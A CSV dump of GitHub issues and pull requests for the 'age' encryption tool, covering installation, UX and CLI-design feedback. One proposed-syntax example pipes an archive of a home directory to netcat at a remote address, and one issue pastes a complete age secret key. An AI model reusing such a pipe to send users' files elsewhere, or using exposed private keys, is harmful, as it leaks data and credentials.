FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/45,543274068,MDExOlB1bGxSZXF1ZXN0MzU3NTc3ODgy,45,Installation: mention Linux for Homebrew,217554,closed,FALSE,NA,NA,0,2019-12-28T19:54:29Z,2019-12-29T13:47:02Z,2019-12-29T13:47:02Z,CONTRIBUTOR,NA,"Since Homebrew now works on linux (https://docs.brew.sh/Homebrew-on-Linux), you can use the same installation steps for Linux as you would for macOS. I tested this on Ubuntu 19.10.",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/45/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/45/comments,https://api.github.com/repos/FiloSottile/age/issues/45/events,https://github.com/FiloSottile/age/pull/45,https://api.github.com/repos/FiloSottile/age/pulls/45
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/44,543266931,MDU6SXNzdWU1NDMyNjY5MzE=,44,Question: What's the maximum file size to encrypt/decrypt,8258609,closed,FALSE,NA,NA,1,2019-12-28T18:39:16Z,2019-12-29T14:06:04Z,2019-12-29T14:06:04Z,NONE,NA,"I'm a simple developer with very little crypto knowledge, so I'm trying to understand how `age` works internally.

`age` is using authenticated encryption and is using streaming/chunking so that you can encrypt/decrypt large files without having to put the whole file into the RAM.

The chunk size is 64 KiB, the encrypted chunk size is `encChunkSize  = ChunkSize + poly1305.TagSize`, what's 65 KiB + 16 KiB = 81 KiB.

I've read that we have to include the order of the chunk in the encrypted chunk so that you cannot change the ciphertext (mix up encrypted chunks).

How I read the `age` documentation, the Poly1305 authenticator (16 bytes) is a random nonce. Also, in the STREAM algorithm, a 11 byte nonce and a 1 byte last block flag is used.

As far as I understand, the 11 byte nonce is for indicating the order of the chunk, with chunk1, the 11 byte nonce is 1, with chunk2, the 11 byte nonce is 2, etc.

So, does this mean that the theoretical max. size of file `age` can handle is 2^(11*8)*64 KiB?

Sorry in case it does not make any sense, I'm just trying to understand. :smile:

",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/44/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/44/comments,https://api.github.com/repos/FiloSottile/age/issues/44/events,https://github.com/FiloSottile/age/issues/44,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/43,543254944,MDExOlB1bGxSZXF1ZXN0MzU3NTYyMzEw,43,Get recipient keys from https:// and file:// URLs,212168,closed,FALSE,NA,NA,10,2019-12-28T17:30:03Z,2021-01-03T14:10:25Z,2021-01-03T14:10:25Z,NONE,NA,"This patch includes support for https:// and file:// URLs as recipient arguments. The URL is fetched and each line is added as a recipient.

e.g.

    -r https://github.com/<user>.keys       (Use GitHub keys)
    -r file:///home/<user>/.ssh/<key>.pub   (Use local SSH key)

This is mostly useful to allow recipient keys to be specified directly from a GitHub URL (or other service which provides an equivalent)",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/43/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/43/comments,https://api.github.com/repos/FiloSottile/age/issues/43/events,https://github.com/FiloSottile/age/pull/43,https://api.github.com/repos/FiloSottile/age/pulls/43
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/41,543164292,MDU6SXNzdWU1NDMxNjQyOTI=,41,UX: Confusing error message when decrypting with incorrect passphrase,895919,closed,FALSE,NA,NA,0,2019-12-28T13:24:49Z,2019-12-31T13:20:47Z,2019-12-31T13:20:47Z,NONE,NA,"I’ve encrypted simple string using a passphrase. Then I tried to decrypt it, and got message saying saying “Error: no identity matched a recipient”. It took me a few retries to understand that entered passphrase is incorrect. If possible, can this message be improved?

```
~/age$ cat out | ./age -d
Enter passphrase: <wrong>
Error: no identity matched a recipient
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
~/age$ 
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/41/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/41/comments,https://api.github.com/repos/FiloSottile/age/issues/41/events,https://github.com/FiloSottile/age/issues/41,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/40,543129166,MDU6SXNzdWU1NDMxMjkxNjY=,40,Use age-encryption.org for brew tap,122287,closed,FALSE,NA,NA,2,2019-12-28T11:33:58Z,2020-01-03T15:41:58Z,2019-12-29T13:59:56Z,NONE,NA,"Awesome library!

Two thoughts:

- How about using https://age-encryption.org for the brew taps?

- You could also use the Github verification system to ""prove"" that you control age-encryption.org, making it easier to trust that it's the right one. ",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/40/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/40/comments,https://api.github.com/repos/FiloSottile/age/issues/40/events,https://github.com/FiloSottile/age/issues/40,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/39,543098751,MDU6SXNzdWU1NDMwOTg3NTE=,39,UX: Confirm passphrase,8314616,closed,FALSE,NA,NA,1,2019-12-28T08:52:33Z,2019-12-30T00:38:34Z,2019-12-30T00:38:34Z,NONE,NA,"<!-- Did age not do what you expected?
Was it hard to figure out how to do something?
Could an error message be more helpful?
It's not you, it's us. We want to hear about it. -->

## What were you trying to do

Encrypting a file with a passphrase.

## What happened

Passphrase was only asked once (no confirmation was asked).

While asking for a confirmation of the passphrase is not foolproof, it may help prevent typos when encrypting files (the user may assume that everything went fine and delete the unencrypted file, only to later find out that the file had been encrypted with a wrong passphrase).",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/39/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/39/comments,https://api.github.com/repos/FiloSottile/age/issues/39/events,https://github.com/FiloSottile/age/issues/39,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/38,543086171,MDU6SXNzdWU1NDMwODYxNzE=,38,Signing and signature validation ,9638362,closed,FALSE,NA,NA,4,2019-12-28T07:28:46Z,2019-12-30T11:04:42Z,2019-12-30T11:04:42Z,NONE,NA,"As I understand, the project is ""pgp killer"" that sounds incredibly cool.

1. Is it possible to sign a text and validate signature?
2. Is it possible to use ssh key pair for it?

Sorry if I missed something from the readme. ",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/38/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/38/comments,https://api.github.com/repos/FiloSottile/age/issues/38/events,https://github.com/FiloSottile/age/issues/38,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/37,543072459,MDU6SXNzdWU1NDMwNzI0NTk=,37,Don't take passphrase via CLI param,8872119,closed,FALSE,NA,NA,2,2019-12-28T05:48:35Z,2019-12-28T06:08:32Z,2019-12-28T06:08:31Z,NONE,NA,"On unix systems, each unprivileged user has read access to the CLI params of all processes running on the system. Thus, CLI params are to be considered public information and are to be deemed unfit as a means to transport secret data like passphrases. age shouldn't support a mode that takes the passphrase as CLI params. Safer alternatives are manual prompting as well as environment variables.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/37/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/37/comments,https://api.github.com/repos/FiloSottile/age/issues/37/events,https://github.com/FiloSottile/age/issues/37,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/36,543067286,MDU6SXNzdWU1NDMwNjcyODY=,36,Don't decrypt unless it's a ramdisk,8872119,closed,TRUE,NA,NA,20,2019-12-28T05:10:46Z,2021-04-19T01:29:28Z,2021-04-19T01:29:26Z,NONE,NA,"Currently age, just like gpg, supports decrypting to files. However, files are usually stored on permanent storage media. However, on contemporary file systems, deletion of a file does not lead to deletion of its contents in the block device. And even tools like shred don't help you with modern SSDs which have a complicated wear levelling layer between you and the hardware: shredding won't necessarily overwrite the data at all.

The only way to use age safely is by using a ramdisk. Therefore, age should refuse operation if the location of the decrypted file is not on a ramdisk. If swap is available on the system, even tmpfs is a danger as it can be paged as well. Maybe if swap is detected, a warning could be emitted?",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/36/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/36/comments,https://api.github.com/repos/FiloSottile/age/issues/36/events,https://github.com/FiloSottile/age/issues/36,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/35,543048009,MDU6SXNzdWU1NDMwNDgwMDk=,35,UX: ,54335683,closed,TRUE,NA,NA,0,2019-12-28T02:41:08Z,2021-04-19T01:30:49Z,2021-04-19T01:30:49Z,NONE,NA,"<!-- Did age not do what you expected?
Was it hard to figure out how to do something?
Could an error message be more helpful?
It's not you, it's us. We want to hear about it. -->

## What were you trying to do
encrypt and then decrypt a message to myself


## What happened
```
[her@noodlieness keys]$ keepo-keygen -o blinko.txt
Public key: age1uk0cpzk0m6yvhy4nhu636hmeq5taklwedxyvq5yqw2pjezec3aeqr6z6tf
[her@noodlieness keys]$ cat blinko.txt 
# created: 2019-12-27T18:11:59-08:00
# public key: age1uk0cpzk0m6yvhy4nhu636hmeq5taklwedxyvq5yqw2pjezec3aeqr6z6tf
AGE-SECRET-KEY-18WHG2YFG6XTTJASHXXUFD3WRAD0MN6VSR6H3C4FWPE00FUQ6LP2QKMLPLV
[her@noodlieness keys]$ touch psst.txt
[her@noodlieness keys]$ echo BANANARAMA >> psst.txt
[her@noodlieness keys]$ age -i psst.txt -o psst.age
bash: age: command not found...
Failed to search for file: Failed to download gpg key for repo 'google-cloud-sdk': Status code: 404 for https://packages.cloud.google.com/yum/doc/yum-key.gpg;https:/packages.cloud.google.com/yum/doc/rpm-package-key.gpg (IP: 172.217.14.238)
[her@noodlieness keys]$ keepo -i psst.txt -o psst.keepo
Error: -i/--identity can't be used in encryption mode.
Did you forget to specify -d/--decrypt?
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
[her@noodlieness keys]$ age -e psst.txt
bash: age: command not found...
Failed to search for file: Failed to download gpg key for repo 'google-cloud-sdk': Status code: 404 for https://packages.cloud.google.com/yum/doc/yum-key.gpg;https:/packages.cloud.google.com/yum/doc/rpm-package-key.gpg (IP: 172.217.14.238)
[her@noodlieness keys]$ keepo -e psst.txt
flag provided but not defined: -e
Usage:
    age -r RECIPIENT [-a] [-o OUTPUT] [INPUT]
    age --decrypt [-i KEY] [-o OUTPUT] [INPUT]

Options:
    -o, --output OUTPUT         Write the result to the file at path OUTPUT.
    -a, --armor                 Encrypt to a PEM encoded format.
    -p, --passphrase            Encrypt with a passphrase.
    -r, --recipient RECIPIENT   Encrypt to the specified RECIPIENT. Can be repeated.
    -d, --decrypt               Decrypt the input to the output.
    -i, --identity KEY          Use the private key file at path KEY. Can be repeated.

INPUT defaults to standard input, and OUTPUT defaults to standard output.

RECIPIENT can be an age public key, as generated by age-keygen, (""age1..."")
or an SSH public key (""ssh-ed25519 AAAA..."", ""ssh-rsa AAAA..."").

KEY is a path to a file with age secret keys, one per line
(ignoring ""#"" prefixed comments and empty lines), or to an SSH key file.
Multiple keys can be provided, and any unused ones will be ignored.

Example:
    $ age-keygen -o key.txt
    Public key: age1ql3z7hjy54pw3hyww5ayyfg7zqgvc7w3j2elw8zmrj2kg5sfn9aqmcac8p
    $ tar cvz ~/data | age -r age1ql3z7hjy54pw3hyww5ayyfg7zqgvc7w3j2elw8zmrj2kg5sfn9aqmcac8p > data.tar.gz.age
    $ age -d -i key.txt -o data.tar.gz data.tar.gz.age
[her@noodlieness keys]$ ls
blinko.txt  psst.txt
[her@noodlieness keys]$ keepo -i blinko.txt -r blinko.txt -o psst.keepo
Error: -i/--identity can't be used in encryption mode.
Did you forget to specify -d/--decrypt?
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
[her@noodlieness keys]$ keepo -r blinko.txt -o psst.keepo
Error: unknown recipient type: ""blinko.txt""
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
[her@noodlieness keys]$ cat blinko.txt 
# created: 2019-12-27T18:11:59-08:00
# public key: age1uk0cpzk0m6yvhy4nhu636hmeq5taklwedxyvq5yqw2pjezec3aeqr6z6tf
AGE-SECRET-KEY-18WHG2YFG6XTTJASHXXUFD3WRAD0MN6VSR6H3C4FWPE00FUQ6LP2QKMLPLV
[her@noodlieness keys]$ keepo -r age1uk0cpzk0m6yvhy4nhu636hmeq5taklwedxyvq5yqw2pjezec3aeqr6z6tf -o psst.keepo psst.txt
Error: failed to open output file ""psst.keepo"": open psst.keepo: file exists
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
[her@noodlieness keys]$ rm psst.keepo
[her@noodlieness keys]$ keepo -r age1uk0cpzk0m6yvhy4nhu636hmeq5taklwedxyvq5yqw2pjezec3aeqr6z6tf -o psst.keepo psst.txt
[her@noodlieness keys]$ ls
blinko.txt  psst.keepo  psst.txt
[her@noodlieness keys]$ cat psst.keepo
age-encryption.org/v1
-> X25519 kvPkGMflX3AUVKiNx6kSwRFh+pHbSqBiKPl9cHaQVwQ
UmUNKlfqVvtay5VF8NBvTm94pFF1TwzqzISAZsC7riw
--- tl8SAlrTcCE1sAiKz/wRzv7VKu1wDmit3cc1RV+Mk5c
�
����8o�@�U�=����-6�[`��
q�g]$���c��Y[her@noodlieness keys]$ keepo -d psst.keepo
Error: no identity matched a recipient
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
[her@noodlieness keys]$ keepo -d psst.keepo -i blinko.txt
Error: too many arguments.
age accepts a single optional argument for the input file.
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
[her@noodlieness keys]$ keepo -d psst.keepo
Error: no identity matched a recipient
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
[her@noodlieness keys]$ rm psst.keepo
[her@noodlieness keys]$ keepo -r age1uk0cpzk0m6yvhy4nhu636hmeq5taklwedxyvq5yqw2pjezec3aeqr6z6tf -o keepo.psst psst.txt
[her@noodlieness keys]$ keepo -d keepo.psst
Error: no identity matched a recipient
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
[her@noodlieness keys]$ keepo -i AGE-SECRET-KEY-18WHG2YFG6XTTJASHXXUFD3WRAD0MN6VSR6H3C4FWPE00FUQ6LP2QKMLPLV -d keepo.psst
Error: failed to open file: open AGE-SECRET-KEY-18WHG2YFG6XTTJASHXXUFD3WRAD0MN6VSR6H3C4FWPE00FUQ6LP2QKMLPLV: no such file or directory
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
[her@noodlieness keys]$ keepo -i blinko.txt -d keepo.psst
BANANARAMA
[her@noodlieness keys]$ 
```

In the end it was the fact that I had to use the raw key as a recipient, and the identity file itself when decoding.

Otherwise, I love it! Thank you! I'm going to use it in production, because I'm a frothing mad data scientist.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/35/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/35/comments,https://api.github.com/repos/FiloSottile/age/issues/35/events,https://github.com/FiloSottile/age/issues/35,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/34,543046709,MDU6SXNzdWU1NDMwNDY3MDk=,34,UX: Handle Multiple SSH Keys/Recipients in Single Flag Input,2636183,closed,TRUE,NA,NA,0,2019-12-28T02:30:41Z,2021-04-19T03:39:18Z,2021-04-19T03:39:17Z,NONE,NA,"## What were you trying to do

Use `age` to encrypt a file with multiple SSH recipients in a single flag-passed `-r, --recipient` value.

## What happened

(didn't ""happened"", rather cannot happen)

I'm trying to encrypt a file with multiple SSH recipients by grabbing their public SSH keys set on Github. The command is:

```
age -r ""$(curl https://github.com/<username>.keys)"" -o encrypted-file.txt to-encrypt.txt
```

Currently, the `-r,--recipient` flag can be used multiple times to pass multiple keys. However, it doesn't expect a single passing to contain multiple keys, and discards the `rest` returned from `ssh.ParseAuthorizedKey` (4th-positioned return value):

https://github.com/FiloSottile/age/blob/bbab440e198a4d67ba78591176c7853e62d29e04/internal/age/ssh.go#L150-L152

The `ssh.ParseAuthorizedKey` func will look for the first `\n`, split the input at the point, and return the rest:

https://github.com/golang/crypto/blob/53104e6ec876ad4e22ad27cce588b01392043c1b/ssh/keys.go#L178-L180

Without `-r,--recipient` accepting multiple SSH keys at once, user will either have to download the keys (i.e. `wget https://github.com/<username>.keys`), split them into multiple files, and pass `-r` as many times as the number of files resulting from splitting `<username.keys>`; or they will have to use some clever shell tricks to split them and pass multiple `-r` in a one-liner.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/34/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/34/comments,https://api.github.com/repos/FiloSottile/age/issues/34/events,https://github.com/FiloSottile/age/issues/34,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/33,543046560,MDU6SXNzdWU1NDMwNDY1NjA=,33,Release binaries for linux/arm64,35047,closed,FALSE,NA,NA,2,2019-12-28T02:29:37Z,2019-12-29T14:11:01Z,2019-12-29T14:11:01Z,NONE,NA,"Perhaps as a piece of #25, consider producing linux/arm64 binaries.

I was able to build on this platform and `go test -v ./...` passed. There's also test support for arch: arm64 on Travis CI.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/33/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/33/comments,https://api.github.com/repos/FiloSottile/age/issues/33/events,https://github.com/FiloSottile/age/issues/33,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/32,543045279,MDU6SXNzdWU1NDMwNDUyNzk=,32,On FreeBSD tests output unprintable/undersired characters,1034582,closed,FALSE,NA,NA,1,2019-12-28T02:19:26Z,2019-12-30T00:44:13Z,2019-12-30T00:44:13Z,CONTRIBUTOR,NA,"## Environment

* OS: FreeBSD 13-CURRENT
* age version: 18edf29a75c64d9ce6450ec64b28543b2bbbaa18

## What were you trying to do
Run `go test -v ./...`

## What happened

```
--- PASS: TestEncryptDecryptX25519 (0.00s)
    age_test.go:54: age-encryption.org/v1
        -> X25519 q3dn6jIZ6k8iKh+gzunWgZTdaCQUrhIRB7yKScaVMkI
        tEWRgdEAtRhUwyDZ0NjhYtA0put9gRJSs4yglLzBQDA
        -> X25519 3LZOn5XR3Nv4B1VVquM/yJw0b+YeMwG8DsGYxTaxqD8
        pcDSuDIk/CIjsxDDSzhruhTMpGvza+Hq83tqGWuwn7E
        --- +R/FzWzYipcHNaaYJoovYt5iQ9tKJIE7xw70TVVPr4Y
        J�9M7�M�v��*�T���(�%8|hr��nϹ�s
```

Noticed while trying to add FreeBSD CI via Cirrus-CI and it seems that Cirrus does not display the test output: https://cirrus-ci.com/task/5140345440698368

Output is visible in the full log https://api.cirrus-ci.com/v1/task/5140345440698368/logs/test.log



",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/32/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/32/comments,https://api.github.com/repos/FiloSottile/age/issues/32/events,https://github.com/FiloSottile/age/issues/32,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/31,543038225,MDExOlB1bGxSZXF1ZXN0MzU3MzY4MDc2,31,Update the installation and build instructions.,372693,closed,FALSE,NA,NA,1,2019-12-28T01:27:45Z,2019-12-28T02:23:18Z,2019-12-28T01:44:44Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/31/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/31/comments,https://api.github.com/repos/FiloSottile/age/issues/31/events,https://github.com/FiloSottile/age/pull/31,https://api.github.com/repos/FiloSottile/age/pulls/31
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/30,543034490,MDU6SXNzdWU1NDMwMzQ0OTA=,30,UX: Maybe subcommands should be the 1st argument instead of options,372693,closed,TRUE,NA,NA,2,2019-12-28T01:01:27Z,2021-04-19T01:50:42Z,2021-04-19T01:50:41Z,CONTRIBUTOR,NA,"This is an arguable style matter. But I find the 'modern' style of `go` and `git` a bit easier to use. E.g.:

`age decrypt options...`

`age encrypt options...`

Then you'd get rid of `-d`, `--decrypt`, and `-r` and `-p` would no longer implicitly mean ""encrypt"". It'd be explicit.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/30/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/30/comments,https://api.github.com/repos/FiloSottile/age/issues/30/events,https://github.com/FiloSottile/age/issues/30,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/29,543034009,MDU6SXNzdWU1NDMwMzQwMDk=,29,UX: Can't intermix arguments and options,372693,closed,TRUE,NA,NA,1,2019-12-28T00:58:15Z,2021-04-19T01:45:17Z,2019-12-28T01:39:46Z,CONTRIBUTOR,NA,"I keep getting this:

```
~/age/cmd/age % ./age -d blorp --output snort
Error: too many arguments.
age accepts a single optional argument for the input file.
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
~/age/cmd/age % ./age -d --output snort blorp 
... success
```

One way to handle this would be to make the input an option (`-i`, `--input`), and not have any arguments at all. (But see bug #30 about using arguments for subcommands.) That would be maximally consistent and clear.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/29/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/29/comments,https://api.github.com/repos/FiloSottile/age/issues/29/events,https://github.com/FiloSottile/age/issues/29,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/28,543032903,MDExOlB1bGxSZXF1ZXN0MzU3MzYzNTM1,28,Provide a `--output` option.,372693,closed,FALSE,NA,NA,1,2019-12-28T00:51:02Z,2019-12-28T01:33:46Z,2019-12-28T01:33:27Z,CONTRIBUTOR,NA,For consistency across all options.,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/28/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/28/comments,https://api.github.com/repos/FiloSottile/age/issues/28/events,https://github.com/FiloSottile/age/pull/28,https://api.github.com/repos/FiloSottile/age/pulls/28
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/27,543031523,MDU6SXNzdWU1NDMwMzE1MjM=,27,UX: Command arguments are order sensitive,3820725,closed,TRUE,NA,NA,2,2019-12-28T00:42:51Z,2021-04-19T01:45:11Z,2021-04-19T01:45:11Z,NONE,NA,"<!-- Did age not do what you expected?
Was it hard to figure out how to do something?
Could an error message be more helpful?
It's not you, it's us. We want to hear about it. -->

## What were you trying to do
Decrypt using a custom key.

## What happened
I received an error stating `too many arguments`. The problem seemed to be that I had the `-d <filename>` before the `-i <filename>`. Reversing these two arguments caused `age` to behave as I expected. 

The error message as stated made me think the problem was in the `-i <filename>` component of the command as it just says `""input file""`, but I think the problem was that it tried to keep reading more files for the `-d` parameter when I expected it to stop and go on to the `-i` parameter input.

```
$ age -d test.age -i ~/.config/age/keys.txt
Error: too many arguments.
age accepts a single optional argument for the input file.
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]

$ age -i ~/.config/age/keys.txt -d test.age
hello there
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/27/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/27/comments,https://api.github.com/repos/FiloSottile/age/issues/27/events,https://github.com/FiloSottile/age/issues/27,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/26,543018796,MDExOlB1bGxSZXF1ZXN0MzU3MzUxNzAy,26,"Fix a typo in the README (""I"" should be ""It"")",11941174,closed,FALSE,NA,NA,1,2019-12-27T23:26:16Z,2019-12-27T23:44:17Z,2019-12-27T23:28:50Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/26/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/26/comments,https://api.github.com/repos/FiloSottile/age/issues/26/events,https://github.com/FiloSottile/age/pull/26,https://api.github.com/repos/FiloSottile/age/pulls/26
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/25,542986540,MDU6SXNzdWU1NDI5ODY1NDA=,25,Consider goreleaser for building releases,6942,closed,FALSE,NA,NA,2,2019-12-27T20:50:27Z,2021-01-02T22:41:45Z,2021-01-02T22:41:45Z,CONTRIBUTOR,NA,"[goreleaser](https://goreleaser.com/) makes it really easy to build Go binaries for multiple platforms, including generating `.rpm`s, `.deb`s, tarballs, zip files, Homebrew formulae, Snapcrafts, Scoops, and the like. It would be a great fit for age.

Let me know if you'd like a PR that adds this. Thanks to @joemiller who contributed this to chezmoi in https://github.com/twpayne/chezmoi/pull/33 - I'd like to pay the contribution forward.
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/25/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/25/comments,https://api.github.com/repos/FiloSottile/age/issues/25/events,https://github.com/FiloSottile/age/issues/25,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/24,542921300,MDExOlB1bGxSZXF1ZXN0MzU3MjcxMzcy,24,Finish painting the bikeshed,1225294,closed,FALSE,NA,NA,0,2019-12-27T16:12:38Z,2019-12-27T16:13:22Z,2019-12-27T16:13:21Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/24/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/24/comments,https://api.github.com/repos/FiloSottile/age/issues/24/events,https://github.com/FiloSottile/age/pull/24,https://api.github.com/repos/FiloSottile/age/pulls/24
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/23,534359417,MDExOlB1bGxSZXF1ZXN0MzUwMjgwNjAw,23,.github: add issue templates,1225294,closed,FALSE,NA,NA,0,2019-12-07T05:54:38Z,2019-12-07T05:58:12Z,2019-12-07T05:58:08Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/23/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/23/comments,https://api.github.com/repos/FiloSottile/age/issues/23/events,https://github.com/FiloSottile/age/pull/23,https://api.github.com/repos/FiloSottile/age/pulls/23
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/22,529172599,MDU6SXNzdWU1MjkxNzI1OTk=,22,CLI user interface?,123276,closed,FALSE,NA,NA,5,2019-11-27T07:41:56Z,2019-11-28T07:03:58Z,2019-11-28T00:02:18Z,NONE,NA,"Hi,

thanks a lot for writing age, I'm really looking forward to using it!

Is the CLI user interface already fixed, or are you open to a discussion about it?

I'd like to propose the following:

 * Add subcommands (like `git` and `go`):
   * `age encrypt` (maybe default?)
   * `age decrypt`
   * `age generate`
 * Use the double-dash syntax (maybe with `pflag`?) to distinguish between short and long options

With these proposed modifications, the commands from the spec would look as follows:

    $ age generate > key.txt

    $ echo ""_o/"" | age encrypt pubkey:98W5ph53zfPGOzEOH-fMojQ4jUY7VLEmtmozREqnw4I > hello.txt.age

    $ age decrypt key.txt < hello.txt.age
    _o/

    $ tar cv ~/xxx | age encrypt github:Benjojo github:FiloSottile | nc 192.0.2.0 1234

    $ echo ""_o/"" | age encrypt -o hello.age pubkey:98W5ph53zfPGOzEOH-fMojQ4jUY7VLEmtmozREqnw4I

    $ age encrypt -i hello.txt -o hello.txt.age -p
    Type passphrase:

The upsides are:
 * Adding subcommands would avoid ambiguities by forcing the user to be explicit about the intended operation. With `gpg`, I'm never entirely sure if it is in encrypt or decrypt or signing or whatever mode. In addition, this makes it easy to distinguish between a command (`generate`, `encrypt`) and an option (`--output`, `--recipient` etc.).
 * Make it clear to the user that subcommands are mutually exclusive: `age encrypt generate -o foo` is clearly wrong, but `age -encrypt -generate -o foo` is not so clear in my opinion.

For the flag parsing, I really like http://github.com/spf13/pflag, we could also implement that ourselves. Subcommands can be implemented without an external dependency. What's your take on dependencies for `age`? Stdlib only?

What do you think? I'm willing to help set this up if you're up for it, if not please just close this issue and carry on. Thanks!
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/22/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/22/comments,https://api.github.com/repos/FiloSottile/age/issues/22/events,https://github.com/FiloSottile/age/issues/22,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/21,528694989,MDU6SXNzdWU1Mjg2OTQ5ODk=,21,Can't compile: undefined: ssh.PassphraseNeededError,8352292,closed,FALSE,NA,NA,4,2019-11-26T12:32:11Z,2019-11-26T22:59:35Z,2019-11-26T22:59:35Z,NONE,NA,"Trying to build it, I get:
```
dreadnought:~ fastidious$ go get github.com/FiloSottile/age/cmd/age/
# github.com/FiloSottile/age/cmd/age
go/src/github.com/FiloSottile/age/cmd/age/parse.go:86:25: undefined: ssh.PassphraseNeededError
```
Go version `go1.13.1 darwin/amd64`.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/21/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/21/comments,https://api.github.com/repos/FiloSottile/age/issues/21/events,https://github.com/FiloSottile/age/issues/21,NA
